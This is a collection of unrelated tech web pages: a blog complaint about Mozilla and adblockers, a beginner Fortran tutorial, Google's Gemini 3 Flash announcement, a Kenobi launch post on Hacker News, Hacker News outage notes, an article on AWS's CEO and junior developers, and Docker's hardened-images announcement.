    &lt;head rend="h2"&gt;📝 Is Mozilla trying hard to kill itself?&lt;/head&gt;
    &lt;p&gt;In an interview with “The Verge”, the new Mozilla CEO, Enzor-DeMeo, IMHO hints that axing adblockers is something that, at the very least, was on the table in some form and at some point. From the article:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;He says he could begin to block ad blockers in Firefox and estimates that’d bring in another $150 million, but he doesn’t want to do that. It feels off-mission.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;It may be just me, but I read this as “I don't want to 😜 😜 but I'll kill AdBlockers in Firefox for buckerinos 😂”. This disappoints and saddens me a lot, and I hope I'm wrong.&lt;/p&gt;
    &lt;p&gt;I've been using Firefox before it was called that. Heck, I even used the Mozilla Application Suite back in the day. It was its commitment to open standards and the open web, and its powerful add-on system, that attracted me to its software.&lt;/p&gt;
    &lt;p&gt;Honestly, that's what's been keeping me. I think that's also what's been keeping their loyal base of users with the project, the geeks and nerds that care about privacy. It's the same group of people who helped it get very popular at one point.&lt;/p&gt;
    &lt;p&gt;Killing one of its advantages over the Chromium engine, being able to have a fucking adblocker that's actually useful, and that nowadays is a fucking security feature due to malvertising, will be another nail in the coffin, IMHO. The core community will feel disenfranchised, and this may have negative consequences for the project. You know why? Because these are some of the people that the normies turn to when they want tech advice.&lt;/p&gt;
    &lt;p&gt;For fuck sake, for-profit side of Mozilla, get a damn grip!&lt;/p&gt;
    &lt;p&gt;Update, since this is getting traction on Reddit&lt;/p&gt;
    &lt;p&gt;I'm not against Mozilla making money. Like a regular citizen needs to make money, companies and even nonprofits need it too. That's the world we live in, whether we like it or not.&lt;/p&gt;
    &lt;p&gt;What bothers me is how the new CEO mentions something that he could do but doesn't want to. If he doesn't want to, why say it? It has the potential to cause bad PR, and it has.&lt;/p&gt;
    &lt;p&gt;Of course, I know I may not be interpreting this correctly.&lt;/p&gt;
    &lt;p&gt;Right now, I'm on the fence. His statement leads me to believe that the option is still very much on the table; otherwise, he wouldn't mention it.&lt;/p&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;Learning the oldest programming language&lt;/head&gt;
    &lt;p&gt;While I probably should be learning a language like C, Go, or whatever new trendy language the ThePrimeagen mentions on Twitter (OCaml?), I'm going to attempt to learn Fortran[1].&lt;/p&gt;
    &lt;head rend="h2"&gt;A quick history&lt;/head&gt;
    &lt;p&gt;Fortran, which stands for FORmula TRANslator[2], was created at IBM by John Backus in 1957 for scientific applications and has apparently been popular for high-performance computing and benchmarking supercomputers in recent years. Fortran has had several subsequent releases since then; FORTRAN 77, Fortran 90, Fortran 95, Fortran 2003, Fortran 2008, and the latest Fortran 2018.&lt;/p&gt;
    &lt;head rend="h2"&gt;Which version of Fortran?&lt;/head&gt;
    &lt;p&gt;To understand what version of Fortran to learn/use, we first must understand the difference between fixed form and free form Fortran. The fixed form layout comes from the very beginning of Fortran, inherited from punch cards, and has odd restrictions about the column in which comments and statements are placed. The free form layout, first introduced in Fortran 90, removed special columns and added the ability to write comments wherever, and is what we'll be learning in this article. The compiler we'll be using is GNU Fortran, or &lt;code&gt;gfortran&lt;/code&gt;. You can install it via Homebrew (macOS) with the &lt;code&gt;gcc&lt;/code&gt; formula, or install it using a package manager for your OS. To tell &lt;code&gt;gfortran&lt;/code&gt; that your code uses the free form layout, set the file extension to &lt;code&gt;.f90&lt;/code&gt; or newer. The following comment on the Fortran discussion board explains this well.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The .f90 suffix means that the source code is free format, not that&lt;/p&gt;&lt;lb/&gt;the code conforms to the Fortran 90 standard. Code that uses the .f90&lt;lb/&gt;suffix can use features from any Fortran standard. All Fortran&lt;lb/&gt;compilers recognize .f90 as a suffix indicating free source form, but&lt;lb/&gt;some may not recognize a suffix such as .f95, .f03, .f08, or .f18.&lt;lb/&gt;Some users may have build tools that do not recognize suffixes other&lt;lb/&gt;than .f90. Most Fortran source code on GitHub that uses features from&lt;lb/&gt;a standard more recent than Fortran 90 still uses the .f90 suffix.&lt;/quote&gt;
    &lt;head rend="h2"&gt;Understanding the syntax&lt;/head&gt;
    &lt;p&gt;Coming from TypeScript, and before that, Python, I'm very used to (and comfortable with) modern — you might say "aesthetic" — syntax . Although I wouldn't say Fortran syntax is quite modern, it seems to avoid the syntactic sugar nightmares that plague beginners in other languages[3]. Take a look at this &lt;code&gt;helloworld.f90&lt;/code&gt; example below.&lt;/p&gt;
    &lt;code&gt;program helloworld

  print *, 'Hello, world!'

end program helloworld&lt;/code&gt;
    &lt;p&gt;Older Fortran programs required the use of SCREAMING_CASE for all keywords, but in modern Fortran you can and it is recommended to use snake_case (you can still use SCREAMING_CASE or any other case you want though).&lt;/p&gt;
    &lt;p&gt;Just from this small example we can gather that...&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Every Fortran program begins with &lt;code&gt;program &amp;lt;program-name&amp;gt;&lt;/code&gt;and ends with&lt;code&gt;end program &amp;lt;program-name&amp;gt;&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;To display text on the terminal we use &lt;code&gt;print *, '&amp;lt;message&amp;gt;'&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The syntax for printing is a little funky though. What is that asterisk doing there? The asterisk, aside from being used as a mathematical operator, indicates the "default". So for &lt;code&gt;print&lt;/code&gt;, &lt;code&gt;*&lt;/code&gt; means "print to the default output channel" (or "print to the default output file unit" to be precise), which is typically going to be STDOUT.&lt;/p&gt;
    &lt;p&gt;I can't find exactly where this is documented but you don't actually need the start and end &lt;code&gt;program &amp;lt;program-name&amp;gt;&lt;/code&gt;; you could write a hello world program like this, though as I just mentioned this doesn't seem to be a common practice and isn't really very useful in any practical scenario.&lt;/p&gt;
    &lt;code&gt;print *, 'Hello, world!'; end&lt;/code&gt;
    &lt;p&gt;Here's another, slightly more complicated example.&lt;/p&gt;
    &lt;code&gt;program calculator
  implicit none

  real :: x, y, answer
  character(1) :: choice

  print *, 'x:'
  read *, x
  print *, 'y:'
  read *, y

  print *, '+, -, *, /:'
  read *, choice
  if (choice == '+') then
    answer = x + y
  end if
  if (choice == '-') then
    answer = x - y
  end if
  if (choice == '*') then
    answer = x * y
  end if
  if (choice == '/') then
    answer = x / y
  end if

  print *, 'Answer:', answer

end program calculator&lt;/code&gt;
    &lt;p&gt;Starting right at the top, we have something new: &lt;code&gt;implicit none&lt;/code&gt;. Added in Fortran 90, &lt;code&gt;implicit none&lt;/code&gt; disables implicit typing defaults and all variables must be explicitly declared. In Fortran, implicit typing is the practice of assigning default types to variables based on the character a variable name begins with. Variables starting with &lt;code&gt;I&lt;/code&gt; through &lt;code&gt;N&lt;/code&gt; are &lt;code&gt;INTEGER&lt;/code&gt;s, everything else is &lt;code&gt;REAL&lt;/code&gt;. It is "a legacy of the past" and usage of an &lt;code&gt;implicit none&lt;/code&gt; statement is "strongly advised" (implicit none - Fortran Wiki).&lt;/p&gt;
    &lt;p&gt;A common Fortran joke goes along the lines of “GOD is REAL, unless declared INTEGER"[4] because of implicit typing!&lt;/p&gt;
    &lt;p&gt;Moving on, we declare our first variables in this program.&lt;/p&gt;
    &lt;code&gt;real :: x, y, answer
character(1) :: choice&lt;/code&gt;
    &lt;p&gt;Here we are declaring &lt;code&gt;x&lt;/code&gt;, &lt;code&gt;y&lt;/code&gt;, and &lt;code&gt;answer&lt;/code&gt; with the &lt;code&gt;REAL&lt;/code&gt; type, and &lt;code&gt;choice&lt;/code&gt; with the &lt;code&gt;CHARACTER&lt;/code&gt; type. The &lt;code&gt;REAL&lt;/code&gt; type stores floating point numbers[5], and &lt;code&gt;CHARACTER&lt;/code&gt;... stores characters.&lt;/p&gt;
    &lt;p&gt;Next, we prompt the user for our &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; values.&lt;/p&gt;
    &lt;code&gt;print *, 'x:'
read *, x
print *, 'y:'
read *, y&lt;/code&gt;
    &lt;p&gt;Notice how we can take input from the user with &lt;code&gt;read&lt;/code&gt; and assign it to a value with the &lt;code&gt;read *, &amp;lt;variable&amp;gt;&lt;/code&gt; syntax. The asterisk here means read from the default input channel/file unit, which would be STDIN.&lt;/p&gt;
    &lt;p&gt;We do the same for prompting the user to select an operation.&lt;/p&gt;
    &lt;code&gt;print *, '+, -, *, /:'
read *, choice&lt;/code&gt;
    &lt;p&gt;Finally, we use a series of basic if-statements to calculate our answer and display it in the terminal.&lt;/p&gt;
    &lt;code&gt;if (choice == '+') then
  answer = x + y
end if
if (choice == '-') then
  answer = x - y
end if
if (choice == '*') then
  answer = x * y
end if
if (choice == '/') then
  answer = x / y
end if

print *, 'Answer:', answer&lt;/code&gt;
    &lt;p&gt;If we run this, we- wait. Did I even tell you how to compile a Fortran program yet?&lt;/p&gt;
    &lt;head rend="h2"&gt;How do I actually run this?&lt;/head&gt;
    &lt;p&gt;First, compile our calculator program with &lt;code&gt;gfortran -o calculator calculator.f90&lt;/code&gt; . Then you can run it with &lt;code&gt;./calculator&lt;/code&gt;. If you only instruct &lt;code&gt;gfortran&lt;/code&gt; of the input file (&lt;code&gt;gfortran calculator.f90&lt;/code&gt;), the default output executable will be named &lt;code&gt;a.out&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Let's run our program now.&lt;/p&gt;
    &lt;code&gt;$ gfortran -o calculator calculator.f90
$ ./calculator
 x:
10
 y:
2
 +, -, *, /:
*
 Answer:   20.0000000&lt;/code&gt;
    &lt;p&gt;Pretty cool, huh?&lt;/p&gt;
    &lt;head rend="h2"&gt;A few improvements&lt;/head&gt;
    &lt;p&gt;Our calculator isn't perfect yet though. What if the user tries to divide by zero?&lt;/p&gt;
    &lt;code&gt; x:
10
 y:
0
 +, -, *, /:
/
 Answer:         Infinity&lt;/code&gt;
    &lt;p&gt;Probably not the answer you expected. Let's try to fix that.&lt;/p&gt;
    &lt;code&gt;if (choice == '/') then
  if (y /= 0.0) then
    answer = x / y
  else
    print *, 'Error: Division by zero is not allowed.'
	stop
  end if
end if&lt;/code&gt;
    &lt;p&gt;Here we use the inequality operator, &lt;code&gt;/=&lt;/code&gt;, to check if the &lt;code&gt;y&lt;/code&gt; value is zero. Now, if the user tries to divide by zero, we'll print an error message and use the &lt;code&gt;stop&lt;/code&gt; statement to end the program.&lt;/p&gt;
    &lt;p&gt;Great. We got rid of the zero division mess, but our code isn't pretty at all. Who wants a bunch of if statements? We can simplify this using the &lt;code&gt;select case&lt;/code&gt; statement (also known as the &lt;code&gt;case&lt;/code&gt; statement).&lt;/p&gt;
    &lt;code&gt;select case (choice)
  case ('+')
    answer = x + y
  case ('-')
    answer = x - y
  case ('*')
    answer = x * y
  case ('/')
    if (y /= 0.0) then
      answer = x / y
    else
      print *, 'Error: Division by zero is not allowed.'
      stop
    end if
  case default
    print *, 'Invalid choice. Please choose +, -, *, or /.'
    stop
end select&lt;/code&gt;
    &lt;p&gt;This also has the handy benefit of telling the user if they made an invalid choice while selecting the operation.&lt;/p&gt;
    &lt;p&gt;That’s just a quick introduction to a few modern Fortran features: declaring variables, printing and reading to and from the terminal, &lt;code&gt;if&lt;/code&gt; and &lt;code&gt;select case&lt;/code&gt;, and &lt;code&gt;stop&lt;/code&gt;. Next time, we’ll talk more about where Fortran is actually used, cooler things you can build with it, and how the Fortran language &amp;amp; community are rapidly modernizing!&lt;/p&gt;

        &lt;p&gt;Ironically, in the ~3-ish months since I started writing this article, ThePrimagen has recently said he "take[s] back everything i said about FORTRAN" — apparently having some interest in the language! ↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;According to sources listed on Fortran's Wikipedia, the name might also have stood for Formula Translating System or just Formula Translation. ↩︎&lt;/p&gt;

      &lt;item&gt;&lt;p&gt;The first letter of "GOD", a "G", is not within I through N and is therefore of the&lt;/p&gt;&lt;code&gt;REAL&lt;/code&gt;type ("GOD is REAL"). ↩︎&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;You can also use&lt;/p&gt;&lt;code&gt;double precision&lt;/code&gt;for larger (more precise) floating point numbers. ↩︎&lt;/item&gt;

    &lt;head rend="h1"&gt;Gemini 3 Flash: frontier intelligence built for speed&lt;/head&gt;
    &lt;p&gt;Today, we're expanding the Gemini 3 model family with the release of Gemini 3 Flash, which offers frontier intelligence built for speed at a fraction of the cost. With this release, we’re making Gemini 3’s next-generation intelligence accessible to everyone across Google products.&lt;/p&gt;
    &lt;p&gt;Last month, we kicked off Gemini 3 with Gemini 3 Pro and Gemini 3 Deep Think mode, and the response has been incredible. Since launch day, we have been processing over 1T tokens per day on our API. We’ve seen you use Gemini 3 to vibe code simulations to learn about complex topics, build and design interactive games and understand all types of multimodal content.&lt;/p&gt;
    &lt;p&gt;With Gemini 3, we introduced frontier performance across complex reasoning, multimodal and vision understanding and agentic and vibe coding tasks. Gemini 3 Flash retains this foundation, combining Gemini 3's Pro-grade reasoning with Flash-level latency, efficiency and cost. It not only enables everyday tasks with improved reasoning, but also is our most impressive model for agentic workflows.&lt;/p&gt;
    &lt;p&gt;Starting today, Gemini 3 Flash is rolling out to millions of people globally:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For developers in the Gemini API in Google AI Studio, Gemini CLI and our new agentic development platform Google Antigravity&lt;/item&gt;
      &lt;item&gt;For everyone via the Gemini app and in AI Mode in Search&lt;/item&gt;
      &lt;item&gt;For enterprises in Vertex AI and Gemini Enterprise&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Gemini 3 Flash: frontier intelligence at scale&lt;/head&gt;
    &lt;p&gt;Gemini 3 Flash demonstrates that speed and scale don’t have to come at the cost of intelligence. It delivers frontier performance on PhD-level reasoning and knowledge benchmarks like GPQA Diamond (90.4%) and Humanity’s Last Exam (33.7% without tools), rivaling larger frontier models, and significantly outperforming even the best 2.5 model, Gemini 2.5 Pro, across a number of benchmarks. It also reaches state-of-the-art performance with an impressive score of 81.2% on MMMU Pro, comparable to Gemini 3 Pro.&lt;/p&gt;
    &lt;p&gt;In addition to its frontier-level reasoning and multimodal capabilities, Gemini 3 Flash was built to be highly efficient, pushing the Pareto frontier of quality vs. cost and speed. When processing at the highest thinking level, Gemini 3 Flash is able to modulate how much it thinks. It may think longer for more complex use cases, but it also uses 30% fewer tokens on average than 2.5 Pro, as measured on typical traffic, to accurately complete everyday tasks with higher performance.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash pushes the Pareto frontier on performance vs. cost and speed.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash’s strength lies in its raw speed, building on the Flash series that developers and consumers already love. It outperforms 2.5 Pro while being 3x faster (based on Artificial Analysis benchmarking) at a fraction of the cost. Gemini 3 Flash is priced at $0.50/1M input tokens and $3/1M output tokens (audio input remains at $1/1M input tokens).&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash outperforms 2.5 Pro in speed and quality.&lt;/p&gt;
    &lt;head rend="h2"&gt;For developers: intelligence that keeps up&lt;/head&gt;
    &lt;p&gt;Gemini 3 Flash is made for iterative development, offering Gemini 3’s Pro-grade coding performance with low latency — it’s able to reason and solve tasks quickly in high-frequency workflows. On SWE-bench Verified, a benchmark for evaluating coding agent capabilities, Gemini 3 Flash achieves a score of 78%, outperforming not only the 2.5 series, but also Gemini 3 Pro. It strikes an ideal balance for agentic coding, production-ready systems and responsive interactive applications.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash’s strong performance in reasoning, tool use and multimodal capabilities is ideal for developers looking to do more complex video analysis, data extraction and visual Q&amp;amp;A, which means it can enable more intelligent applications — like in-game assistants or A/B test experiments — that demand both quick answers and deep reasoning.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash enables multimodal reasoning in a hand-tracked "ball launching puzzle game" game providing near real-time AI assistance.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash builds and A/B tests new loading spinner designs in near real-time, streamlining the design-to-code process.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash uses multimodal reasoning to analyze and caption an image with contextual UI overlays in near real-time, ultimately transforming a static image into an interactive experience.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash takes a single instruction prompt and codes three unique design variations.&lt;/p&gt;
    &lt;p&gt;We’ve received a tremendous response from companies using Gemini 3 Flash. Companies like JetBrains, Bridgewater Associates, and Figma are already using it to transform their businesses, recognizing how its inference speed, efficiency and reasoning capabilities perform on par with larger models. Gemini 3 Flash is available today to enterprises via Vertex AI and Gemini Enterprise.&lt;/p&gt;
    &lt;head rend="h2"&gt;For everyone: Gemini 3 Flash is rolling out globally&lt;/head&gt;
    &lt;p&gt;Gemini 3 Flash is now the default model in the Gemini app, replacing 2.5 Flash. That means all of our Gemini users globally will get access to the Gemini 3 experience at no cost, giving their everyday tasks a major upgrade.&lt;/p&gt;
    &lt;p&gt;Because of Gemini 3 Flash’s incredible multimodal reasoning capabilities, you can use it to help you see, hear and understand any type of information faster. For example, you can ask Gemini to understand your videos and images and turn that content into a helpful and actionable plan in just a few seconds.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash in the Gemini app can analyze short video content and give you a plan, like how to improve your golf swing.&lt;/p&gt;
    &lt;p&gt;As Gemini 3 Flash is optimized for speed, it can see and guess what you’re drawing while you’re still sketching it.&lt;/p&gt;
    &lt;p&gt;You can upload an audio recording and Gemini 3 Flash will identify your knowledge gaps, create a custom quiz, and give you detailed explanations on the answers.&lt;/p&gt;
    &lt;p&gt;Or you can quickly build fun, useful apps from scratch using your voice without prior coding knowledge. Just dictate to Gemini on the go, and it can transform your unstructured thoughts into a functioning app in minutes.&lt;/p&gt;
    &lt;p&gt;Gemini 3 Flash is also starting to roll out as the default model for AI Mode in Search with access to everyone around the world.&lt;/p&gt;
    &lt;p&gt;Building on the reasoning capabilities of Gemini 3 Pro, AI Mode with Gemini 3 Flash is more powerful at parsing the nuances of your question. It considers each aspect of your query to serve thoughtful, comprehensive responses that are visually digestible — pulling real-time local information and helpful links from across the web. The result effectively combines research with immediate action: you get an intelligently organized breakdown alongside specific recommendations — at the speed of Search.&lt;/p&gt;
    &lt;p&gt;This shines when tackling complex goals with multiple considerations like trying to plan a last-minute trip or learning complex educational concepts quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Try Gemini 3 Flash today&lt;/head&gt;
    &lt;p&gt;Gemini 3 Flash is available now in preview via the Gemini API in Google AI Studio, Google Antigravity, Vertex AI and Gemini Enterprise. You can also access it through other developer tools like Gemini CLI and Android Studio. It’s also starting to roll out to everyone in the Gemini app and AI Mode in Search, bringing fast access to next-generation intelligence at no cost.&lt;/p&gt;
    &lt;p&gt;We’re looking forward to seeing what you bring to life with this expanded family of models: Gemini 3 Pro, Gemini 3 Deep Think and now, Gemini 3 Flash.&lt;/p&gt;

    &lt;div&gt;&lt;p&gt;Hey HN! We’re Rory, Chris, and Felix from Kenobi (&lt;/p&gt;https://kenobi.ai&lt;p&gt;). Kenobi lets you add AI-based content personalization to any website. As a site owner, you install our personalization widget with a script tag, just like you would for e.g. a chatbot integration. As a visitor, you interact with the widget (right now by providing a company name) and Kenobi changes the site content to suit you.&lt;/p&gt;&lt;p&gt;We’ve built a demo that anyone can try here: https://kenobi.ai/start&lt;/p&gt;&lt;p&gt;We believe that large parts of the web are about to go from being static to dynamic because of how adept LLMs are at transforming rendered HTML. And right now we’re focussing on B2B landing page content (as opposed to application UIs) because there is a lot of commercial opportunity for increasing top-of-funnel inbound conversions.&lt;/p&gt;&lt;p&gt;Our journey to Kenobi today is a long and snaking one. You may notice from the post title that we did YC’s Winter 2022 batch (I know that 4 years is practically ancient in YC-dog-years). Kenobi is a hard pivot from our original idea that we got accepted into YC with — a company called Verdn which did trackable environmental donations via an API. Since the summer, we’ve been hacking on different ideas… We started with personalized UI screenshots for outbound campaigns, but then people told us they wanted transformations to their actual site[0] — so we built an agentic workflow to research a visitor-company and “pre-render” changes to a landing site for them. Ultimately, there was too much friction in getting people to incorporate personalized URLs into their cold outbound campaigns[1]. Besides, people kept asking for us to do this for their inbound traffic, and so our current iteration was born.&lt;/p&gt;&lt;p&gt;Right now with Kenobi you pick a page that you’d like to make customizable, and choose [text] elements that you’d like to make dynamic. You can define custom prompting instructions for these elements, and when someone visits your page, our agentic workflow researches their company, and presents the updated content as quickly as possible, usually within a few seconds.[2] You also get a ping in Slack every time this happens so you know who is using your site.&lt;/p&gt;&lt;p&gt;We’ve been experimenting with features such as generating custom imagery that actually looks good and native to the page design, and pulling in company data sources so that e.g. the right case study can be presented based on a visitor’s industry and ICP profile. Our most requested feature is deanonymizing traffic so that Kenobi’s personalization can happen automatically as visitors land on your page — this is coming very soon, as right now you have to specify where you’re coming from.&lt;/p&gt;&lt;p&gt;It’s surprised us just how much business value we’ve gotten from knowing who (most probably) is on the page and asking for a personalized experience. We’ve seen response rates 3x of what we would normally from following people up from companies we know visited our site.&lt;/p&gt;&lt;p&gt;There are many players in this space already, and everyone seems to have their own angle. We are keen to hear thoughts on what people think the future of the personalized internet looks like!&lt;/p&gt;&lt;p&gt;Cheers from London!&lt;/p&gt;&lt;p&gt;P.S. - there's also a video that Chris recorded showing the end-to-end Kenobi experience right now https://www.loom.com/share/bc0a82a2f2fd40f695315bae80e8f5d8&lt;/p&gt;&lt;p&gt;[0] - Many of them had tried AI “microsite” generators but found the maintenance of managing a separate website(s) just for closing deals to be burdensome and inefficient.&lt;/p&gt;&lt;p&gt;[1] - Despite having a CSV export and Clay integration option for our pre-generated website changes, getting people to weave the URLs into their email sequences (everyone uses different tools) seemed almost insurmountable without building what would ostensibly be our own sequencing software.&lt;/p&gt;&lt;p&gt;[2] - We use light foundation models with grounded search for the research step, and translate these into markup changes via another light LLM pass and our own DSL which is optimized for speed.&lt;/p&gt;&lt;/div&gt;

      &lt;p&gt;- HN errored on all authenticated requests with 502 Bad Gateway. It did still respond to a limited amount of unauthenticated requests with presumably cached pages, which did not get updated. The last post on /newest claimed "0 minutes ago", but was actually much older (1:32:57 PM GMT) and not the newest post.&lt;/p&gt;
      &lt;p&gt;- This status page actually identified the outage: https://hackernews.onlineornot.com/ - Pages by Hund and Statuspal did not show the outage.&lt;/p&gt;
      &lt;p&gt;- The last post before the outage was https://news.ycombinator.com/item?id=46301823 (1:39:59 PM GMT). The last comment was https://news.ycombinator.com/item?id=46301848 (1:41:54 PM GMT).&lt;/p&gt;
      &lt;p&gt;- There was an average of ~4 seconds per comment just prior to the outage. Based on this, HN likely went down at 1:41:58 PM GMT.&lt;/p&gt;

    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;AWS CEO Matt Garman outlined 3 solid reasons why companies should not focus on cutting junior developer roles, noting that they âare actually the most experienced with the AI toolsâ.&lt;/p&gt;
    &lt;head rend="h2"&gt;3 Reasons AI Should Not Replace Junior Developers&lt;/head&gt;
    &lt;p&gt;In a tech world obsessed with AI replacing human workers, Matt Garman, CEO of Amazon Web Services (AWS), is pushing back against one of the industryâs most popular cost-cutting ideas.&lt;/p&gt;
    &lt;p&gt;Speaking on WIREDâs The Big Interview podcast, Garman has a bold message for companies racing to cut costs with AI.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;He was asked to explain why he once called replacing junior employees with AI âone of the dumbest ideasâ heâd ever heard, and to expand on how he believes agentic AI will actually change the workplace in the coming years.&lt;/p&gt;
    &lt;head rend="h3"&gt;1) Junior Devs Often Know AI Tools Better&lt;/head&gt;
    &lt;p&gt;First, junior employees are often better with AI tools than senior staff.Â&lt;/p&gt;
    &lt;quote&gt;âNumber one, my experience is that many of the most junior folks are actually the most experienced with the AI tools. So they're actually most able to get the most out of them.â&lt;/quote&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;Fresh grads have grown up with new technology, so they can adapt quickly. Many of them learn AI-powered tools while studying or during internships. They tend to explore new features, find quick methods to write code, and figure out how to get the best results from AI agents.Â&lt;/p&gt;
    &lt;p&gt;According to the 2025 Stack Overflow Developer Survey, 55.5% of early-career developers reported using AI tools daily in their development process, higher than for the experienced folks.&lt;/p&gt;
    &lt;p&gt;This comfort with new tools allows them to work more efficiently. In contrast, senior developers have established workflows and may take more time to adopt. Recent research shows that over half of Gen Z employees are actually helping senior colleagues upskill in AI.&lt;/p&gt;
    &lt;head rend="h3"&gt;2) Junior Developers Shouldnât Be The Default Cost-Saving Move&lt;/head&gt;
    &lt;p&gt;Second, junior staff are usually the least expensive employees.&lt;/p&gt;
    &lt;quote&gt;âNumber two, they're usually the least expensive because they're right out of college, and they generally make less. So if you're thinking about cost optimization, they're not the only people you would want to optimize around.â&lt;/quote&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;Junior employees usually get much less in salary and benefits, so removing them does not deliver huge savings. If a company is trying to save money, it doesnât make that much financial sense.Â&lt;/p&gt;
    &lt;p&gt;So, when companies talk about increasing profit margins, junior employees should not be the default or only target. True optimization, Real cost-cutting means looking at the whole company because there are plenty of other places where expenses can be trimmed.&lt;/p&gt;
    &lt;p&gt;In fact, 30% of companies that laid off workers expecting savings ended up increasing expenses, and many had to rehire later.Â&lt;/p&gt;
    &lt;head rend="h3"&gt;3) Removing Juniors Breaks the Talent Pipeline&lt;/head&gt;
    &lt;p&gt;Third, companies need fresh talent.&lt;/p&gt;
    &lt;quote&gt;âThree, at some point, that whole thing explodes on itself. If you have no talent pipeline that you're building and no junior people that you're mentoring and bringing up through the company, we often find that that's where we get some of the best ideas.â&lt;/quote&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;Think of a company like a sports team. If you only keep veteran players and never recruit rookies, what happens when those veterans retire? You are left with no one who knows how to play the game.&lt;/p&gt;
    &lt;p&gt;Also, hiring people straight out of college brings new ways of thinking into the workplace. They have fresh ideas shaped by the latest trends, motivation to innovate.Â&lt;/p&gt;
    &lt;p&gt;More importantly, they form the foundation of a companyâs future workforce. If a company decides to stop hiring junior employees altogether, it cuts off its own talent pipeline. Over time, that leads to fewer leaders to promote from within.&lt;/p&gt;
    &lt;p&gt;A Deloitte report also notes that the tech workforce is expected to grow at roughly twice the rate of the overall U.S. workforce, highlighting the demand for tech talent. Without a strong pipeline of junior developers coming in, companies might face a tech talent shortage.Â&lt;/p&gt;
    &lt;p&gt;When there are not enough junior hires being trained today, teams struggle to fill roles tomorrow, especially as projects scale.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bottom Line&lt;/head&gt;
    &lt;p&gt;This isnât just corporate talk. As the leader of one of the worldâs largest cloud computing platforms, serving everyone from Netflix to the U.S. intelligence agencies, Garman has a front-row seat to how companies are actually using AI.Â&lt;/p&gt;
    &lt;p&gt;And what he is seeing makes him worried that short-term thinking could damage businesses for years to come. Garmanâs point is grounded in long-term strategy. A company that relies solely on AI to handle tasks without training new talent could find itself short of people.&lt;/p&gt;
    &lt;p&gt;Still, Garman admits the next few years will be bumpy. âYour job is going to change,â he said. He believes AI will make companies more productive as well as the employees.Â&lt;/p&gt;
    &lt;p&gt;When technology makes something easier, people want more of it. AI enables the creation of software faster, allowing companies to develop more products, enter new markets, and serve more customers.&lt;/p&gt;
    &lt;p&gt;Developers will be responsible for more than just writing code, with faster adaptation to new technologies becoming essential. But he has a hopeful message in the end.&lt;/p&gt;
    &lt;p&gt;Thatâs why Geoffrey Hinton has advised that Computer Science degrees remain essential. This directly supports Matt Garmanâs point. Fresh talent with a strong understanding of core fundamentals becomes crucial for filling these higher-value roles of the future.&lt;/p&gt;
    &lt;p&gt;âIâm very confident in the medium to longer term that AI will definitely create more jobs than it removes at first,â Garman said.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;Containers are the universal path to production for most developers, and Docker has always been the steward of the ecosystem. Docker Hub has over 20 billion monthly pulls, with nearly 90% of organizations now relying on containers in their software delivery workflows. That gives us a responsibility: to help secure the software supply chain for the world.&lt;/p&gt;
    &lt;p&gt;Why? Supply-chain attacks are exploding. In 2025, they caused more than $60 billion in damage, tripling from 2021. No one is safe. Every language, every ecosystem, every build and distribution step is a target.&lt;/p&gt;
    &lt;p&gt;For this reason, we launched Docker Hardened Images (DHI), a secure, minimal, production-ready set of images, in May 2025, and since then have hardened over 1,000 images and helm charts in our catalog. Today, we are establishing a new industry standard by making DHI freely available and open source to everyone who builds software. All 26 Million+ developers in the container ecosystem. DHI is fully open and free to use, share, and build on with no licensing surprises, backed by an Apache 2.0 license. DHI now gives the world a secure, minimal, production-ready foundation from the very first pull.&lt;/p&gt;
    &lt;p&gt;If it sounds too good to be true, here’s the bottom line up front: every developer and every application can (and should!) use DHI without restrictions. When you need continuous security patching, applied in under 7 days, images for regulated industries (e.g., FIPS, FedRAMP), you want to build customized images on our secure build infrastructure, or you need security patches beyond end-of-life, DHI has commercial offerings. Simple.&lt;/p&gt;
    &lt;p&gt;Since the introduction of DHI, enterprises like Adobe and Qualcomm have bet on Docker for securing their entire enterprise to achieve the most stringent levels of compliance, while startups like Attentive and Octopus Deploy have accelerated their ability to get compliance and sell to larger businesses.&lt;/p&gt;
    &lt;p&gt;Now everyone and every application can build securely from the first &lt;code&gt;docker build&lt;/code&gt;. Unlike other opaque or proprietary hardened images, DHI is compatible with Alpine and Debian, trusted and familiar open source foundations teams already know and can adopt with minimal change. And while some vendors suppress CVEs in their feed to maintain a green scanner, Docker is always transparent, even when we’re still working on patches, because we fundamentally believe you should always know what your security posture is. The result: dramatically reduced CVEs (guaranteed near zero in DHI Enterprise), images up to 95 percent smaller, and secure defaults without ever compromising transparency or trust.&lt;/p&gt;
